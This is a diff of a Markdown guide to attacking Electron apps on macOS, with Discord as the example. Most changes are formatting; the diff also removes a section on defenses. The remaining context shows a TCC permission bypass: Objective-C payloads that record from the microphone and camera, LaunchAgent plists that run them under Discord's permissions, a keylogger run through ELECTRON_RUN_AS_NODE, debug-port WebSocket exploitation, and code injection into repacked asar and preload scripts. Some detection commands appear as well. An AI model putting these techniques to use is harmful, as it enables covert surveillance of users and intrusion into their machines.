 # Creates: /tmp/app.XXXXXX where X is random
@@ -5125,6 +5283,7 @@ codesign -dv --entitlements :- /Applications/Discord.app
 ```
 
 **Example Discord Signature:**
+
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <plist version="1.0">
@@ -5200,6 +5359,7 @@ ChildProcess { ... }
 ### Audio Capture Payload
 
 **audiocapture.m:**
+
 ```c
 #include <stdio.h>
 #include <syslog.h>
@@ -5262,6 +5422,7 @@ int main() {
 ```
 
 **Compile:**
+
 ```bash
 gcc -framework Foundation -framework AVFoundation audiocapture.m -o audiocapture
 ```
@@ -5269,6 +5430,7 @@ gcc -framework Foundation -framework AVFoundation audiocapture.m -o audiocapture
 ### LaunchD PLIST for Proper Sandbox
 
 **launchdiscord.plist:**
+
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
@@ -5295,6 +5457,7 @@ gcc -framework Foundation -framework AVFoundation audiocapture.m -o audiocapture
 ```
 
 **Execute:**
+
 ```bash
 # Load PLIST
 launchctl load launchdiscord.plist
@@ -5336,6 +5499,7 @@ launchctl unload launchdiscord.plist
 3. Opens DevTools with Console access
 
 **Console Commands:**
+
 ```javascript
 // Same as Node.js REPL
 const { spawn } = require('child_process');
@@ -5345,6 +5509,7 @@ spawn("/Users/user/audiocapture");
 ### LaunchD PLIST for Debug Mode
 
 **launchdiscordinspect.plist:**
+
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
@@ -5365,6 +5530,7 @@ spawn("/Users/user/audiocapture");
 ```
 
 **Execute:**
+
 ```bash
 launchctl load launchdiscordinspect.plist
 # Navigate to chrome://inspect
@@ -5439,6 +5605,7 @@ cat unpack/package.json
 ### Video Capture Payload
 
 **videocapture.m:**
+
 ```c
 #import <AVFoundation/AVFoundation.h>
 
@@ -5501,6 +5668,7 @@ int main(int argc, const char * argv[]) {
 ```
 
 **Compile:**
+
 ```bash
 gcc -framework Foundation -framework AVFoundation videocapture.m -o videocapture
 ```
@@ -5544,6 +5712,7 @@ ls -l /tmp/spycam.mov
 ### Alternative: Unpacked Source
 
 If app doesn't use .asar:
+
 ```bash
 # Source files located directly in Resources/
 ls /Applications/SomeApp.app/Contents/Resources/app/
@@ -5576,6 +5745,7 @@ Discord (has camera/mic access)
 ### Sandbox Profile Inheritance
 
 **From Terminal:**
+
 ```bash
 # Bad: Inherits Terminal's sandbox
 ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
@@ -5583,10 +5753,12 @@ ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
 ```
 
 **From LaunchD:**
+
 ```bash
 # Good: Uses Discord's sandbox
 launchctl load launchdiscord.plist
 # Prompt: "Discord would like to access the microphone"
+
 ```
 
 ### Complete TCC Bypass Flow
@@ -5618,244 +5790,7 @@ tccutil reset Microphone com.hnc.Discord
 tccutil reset Camera com.hnc.Discord
 ```
 
----
 
-## Defense Mechanisms
-
-### Electron Fuses
-
-**What Are Fuses?**
-Compile-time configuration to disable dangerous features.
-
-**Disable ELECTRON_RUN_AS_NODE:**
-```javascript
-// In build script
-const { FusesPlugin } = require('@electron/fuses');
-
-module.exports = {
-  plugins: [
-    new FusesPlugin({
-      version: FuseVersion.V1,
-      [FuseV1Options.RunAsNode]: false,
-    })
-  ]
-};
-```
-
-**Limitations:**
-- Only prevents environment variable method
-- Does NOT prevent debug port injection
-- Does NOT prevent source code modification
-
-### Code Integrity Verification
-
-**asar-integrity Package:**
-```bash
-npm install asar-integrity
-```
-
-**Usage:**
-```javascript
-// Adds SHA-512 hash to Info.plist
-// BUT: No runtime verification implemented
-```
-
-**Manual Verification:**
-```javascript
-// main.js - Add at startup
-const crypto = require('crypto');
-const fs = require('fs');
-const path = require('path');
-
-function verifyIntegrity() {
-  const asarPath = path.join(__dirname, '../app.asar');
-  const expectedHash = 'EXPECTED_SHA256_HERE';
-
-  const fileBuffer = fs.readFileSync(asarPath);
-  const hashSum = crypto.createHash('sha256');
-  hashSum.update(fileBuffer);
-
-  const hex = hashSum.digest('hex');
-
-  if (hex !== expectedHash) {
-    console.error('Integrity check failed!');
-    process.exit(1);
-  }
-}
-
-verifyIntegrity();
-```
-
-### Application Sandboxing
-
-**Enable Sandbox:**
-```javascript
-// main.js
-const { app } = require('electron');
-
-app.enableSandbox();
-
-// Or per-window
-const win = new BrowserWindow({
-  webPreferences: {
-    sandbox: true
-  }
-});
-```
-
-**Effect:**
-- Prevents child process creation
-- Blocks file system access
-- Limits network access
-
-**Limitation:** May break legitimate app functionality
-
-### Disable Debug Features
-
-**Production Build Settings:**
-```javascript
-// package.json
-{
-  "build": {
-    "afterSign": "scripts/notarize.js",
-    "asar": true,
-    "asarUnpack": []
-  }
-}
-
-// main.js
-if (!app.isPackaged) {
-  // Only allow debugging in development
-  app.commandLine.appendSwitch('inspect', '9229');
-}
-```
-
-### Code Obfuscation
-
-**JavaScript Obfuscation:**
-```bash
-npm install javascript-obfuscator
-
-# Obfuscate source before packaging
-javascript-obfuscator src/ --output dist/
-```
-
-**Limitations:**
-- Slows down attacker, doesn't stop them
-- Can impact performance
-- Still reversible with effort
-
-### Current Reality
-
-**Unresolved Issues:**
-
-| Attack Vector | Mitigation Available? |
-|---------------|----------------------|
-| ELECTRON_RUN_AS_NODE | ✅ Yes (Fuses) |
-| Debug Port Injection | ❌ No |
-| Source Modification | ❌ No (partial via obfuscation) |
-
-**Electron's Position:**
-- Local attacks outside their threat model
-- Focus on web-based attacks
-- Responsibility on developers to secure
-
----
-
-## Quick Reference
-
-### Environment Variables
-
-| Variable | Effect |
-|----------|--------|
-| `ELECTRON_RUN_AS_NODE=1` | Start as Node.js with REPL |
-| `ELECTRON_ENABLE_LOGGING=1` | Enable verbose logging |
-| `ELECTRON_ENABLE_STACK_DUMPING=1` | Dump stack on crash |
-
-### Command Line Switches
-
-```bash
-# Debug modes
---inspect[=port]           # Enable V8 inspector
---inspect-brk[=port]       # Break before user code starts
---remote-debugging-port=X  # Enable remote debugging
-
-# Security
---disable-features=RendererCodeIntegrity  # Disable code integrity
---no-sandbox               # Disable sandbox
-```
-
-### Node.js REPL Commands
-
-```javascript
-// Module loading
-require('module_name')
-
-// Process information
-process.version
-process.platform
-process.env
-process.cwd()
-
-// Child processes
-const { spawn } = require('child_process');
-const { exec } = require('child_process');
-spawn('/path/to/binary')
-exec('command')
-
-// File operations
-const fs = require('fs');
-fs.readFileSync('/path/to/file')
-fs.writeFileSync('/path/to/file', 'content')
-```
-
-### asar Commands
-
-```bash
-# List contents
-npx asar list app.asar
-
-# Extract
-npx asar extract app.asar dest_folder
-
-# Pack
-npx asar pack source_folder app.asar
-
-# Extract single file
-npx asar extract-file app.asar file_path
-```
-
-### LaunchD Management
-
-```bash
-# Load PLIST
-launchctl load /path/to/plist
-
-# Unload PLIST
-launchctl unload /path/to/plist
-
-# List loaded jobs
-launchctl list | grep discord
-
-# Remove job
-launchctl remove com.discord.tcc.bypass
-```
-
-### TCC Management
-
-```bash
-# Reset specific service for app
-tccutil reset Microphone com.hnc.Discord
-tccutil reset Camera com.hnc.Discord
-
-# Reset all for app
-tccutil reset All com.hnc.Discord
-
-# View TCC database
-sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db "SELECT * FROM access;"
-```
-
----
 ## Attack Surface Overview
 
 Electron applications expose multiple attack vectors for code injection and privilege abuse:
@@ -5889,6 +5824,7 @@ Electron applications expose multiple attack vectors for code injection and priv
 #### 1. Static Analysis - Application Inspection
 
 **Check Fuse Configuration:**
+
 ```bash
 # Dump fuses from binary
 strings /Applications/Discord.app/Contents/MacOS/Discord | grep -A5 -B5 "dL7pKGdnNz"
@@ -5902,6 +5838,7 @@ npx electron-fuses read /Applications/Discord.app/Contents/MacOS/Discord
 ```
 
 **Verify ASAR Integrity:**
+
 ```bash
 # Check if Info.plist contains integrity hash
 /usr/libexec/PlistBuddy -c "Print :ElectronAsarIntegrity" \
@@ -5914,6 +5851,7 @@ shasum -a 256 /Applications/Discord.app/Contents/Resources/app.asar
 ```
 
 **Inspect Launch Constraints:**
+
 ```bash
 # Check for debug-related launch arguments
 ps aux | grep -i electron | grep -E '(inspect|remote-debugging)'
@@ -5923,6 +5861,7 @@ grep -r "ELECTRON_RUN_AS_NODE" ~/Library/LaunchAgents/
 ```
 
 **Code Review Indicators:**
+
 ```bash
 # Extract and search for suspicious patterns
 npx asar extract app.asar extracted/
@@ -5937,6 +5876,7 @@ grep -r "require.*http\|fetch.*\.js" extracted/ --include="*.js"
 #### 2. Dynamic Analysis - Runtime Monitoring
 
 **Monitor Process Creation:**
+
 ```bash
 # Use sudo execsnoop to watch child processes
 sudo execsnoop -n Discord
@@ -5951,6 +5891,7 @@ fswatch -0 /Applications/Discord.app/Contents/Resources/app.asar | \
 ```
 
 **Network Connection Monitoring:**
+
 ```bash
 # Detect debug port listeners
 lsof -iTCP -sTCP:LISTEN | grep -E '(9229|9230)'
@@ -5963,6 +5904,7 @@ tcpdump -i lo0 -A 'tcp port 9229'
 ```
 
 **TCC Database Monitoring:**
+
 ```bash
 # Watch for TCC changes
 sudo fs_usage -w -f filesys | grep TCC.db
@@ -5973,6 +5915,7 @@ sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
 ```
 
 **LaunchAgent Monitoring:**
+
 ```bash
 # Monitor LaunchAgent directory
 fswatch ~/Library/LaunchAgents/ | while read file; do
@@ -5984,6 +5927,7 @@ done
 #### 3. Code Review Detection
 
 **JavaScript Injection Patterns:**
+
 ```javascript
 // Suspicious patterns in main process code:
 
@@ -6008,6 +5952,7 @@ ipcMain.on('arbitrary-command', (event, cmd) => {
 ```
 
 **LaunchAgent PLIST Indicators:**
+
 ```xml
 <!-- Red flags in PLIST files: -->
 
@@ -6042,6 +5987,7 @@ ipcMain.on('arbitrary-command', (event, cmd) => {
 - Testing TCC inheritance quickly
 
 **Execution:**
+
 ```bash
 # Basic REPL access
 ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
@@ -6056,6 +6002,7 @@ ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord \
 ```
 
 **Advanced Payload - Keylogger:**
+
 ```javascript
 // keylogger.js - Run via ELECTRON_RUN_AS_NODE
 const ioHook = require('iohook');
@@ -6071,6 +6018,7 @@ ioHook.start();
 ```
 
 **Execution:**
+
 ```bash
 ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord keylogger.js
 ```
@@ -6083,6 +6031,7 @@ ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord keylogge
 - Multi-step exploitation needed
 
 **Start Debug Session:**
+
 ```bash
 # Launch with debug port
 /Applications/Discord.app/Contents/MacOS/Discord --inspect=9229
@@ -6110,6 +6059,7 @@ launchctl load ~/Library/LaunchAgents/com.app.debug.plist
 ```
 
 **WebSocket Exploitation:**
+
 ```javascript
 // exploit-debug.js
 const WebSocket = require('ws');
@@ -6152,6 +6102,7 @@ http.get('http://127.0.0.1:9229/json', (res) => {
 - App has no integrity verification
 
 **Extraction and Analysis:**
+
 ```bash
 # Extract ASAR
 npm install -g asar
@@ -6166,6 +6117,7 @@ find extracted/ -name "index.html" -o -name "preload.js"
 ```
 
 **Injection Strategy:**
+
 ```javascript
 // extracted/app_bootstrap/index.js - Add at top
 
@@ -6190,6 +6142,7 @@ const { app } = require('electron');
 ```
 
 **Repackaging:**
+
 ```bash
 # Repack modified source
 npx asar pack extracted/ app.asar
@@ -6213,6 +6166,7 @@ open /Applications/Discord.app
 - Want invisible background execution
 
 **Audio Recording Payload:**
+
 ```objective-c
 // record-audio.m
 #import <AVFoundation/AVFoundation.h>
@@ -6270,11 +6224,13 @@ int main() {
 ```
 
 **Compile:**
+
 ```bash
 gcc -framework Foundation -framework AVFoundation record-audio.m -o record-audio
 ```
 
 **LaunchAgent PLIST:**
+
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -6302,6 +6258,7 @@ gcc -framework Foundation -framework AVFoundation record-audio.m -o record-audio
 ```
 
 **Deploy:**
+
 ```bash
 cp com.audio.capture.plist ~/Library/LaunchAgents/
 launchctl load ~/Library/LaunchAgents/com.audio.capture.plist
@@ -6318,6 +6275,7 @@ tail -f /tmp/rec-*.m4a
 - Faster than extract/repack cycle
 
 **Detection:**
+
 ```bash
 # Check for unpacked source
 ls -la /Applications/SomeApp.app/Contents/Resources/app/
@@ -6330,6 +6288,7 @@ ls -la /Applications/SomeApp.app/Contents/Resources/app/
 ```
 
 **Direct Injection:**
+
 ```bash
 # Find main entry
 MAIN=$(cat /Applications/SomeApp.app/Contents/Resources/app/package.json | \
@@ -6376,6 +6335,7 @@ cp /tmp/newmain.js "/Applications/SomeApp.app/Contents/Resources/app/$MAIN"
 - Target uses `webPreferences.preload`
 
 **Identify Preload Scripts:**
+
 ```bash
 # Search for preload configurations
 npx asar extract app.asar extracted/
@@ -6386,6 +6346,7 @@ grep -r "preload:" extracted/ --include="*.js"
 ```
 
 **Inject into Preload:**
+
 ```javascript
 // Add to beginning of preload.js
 
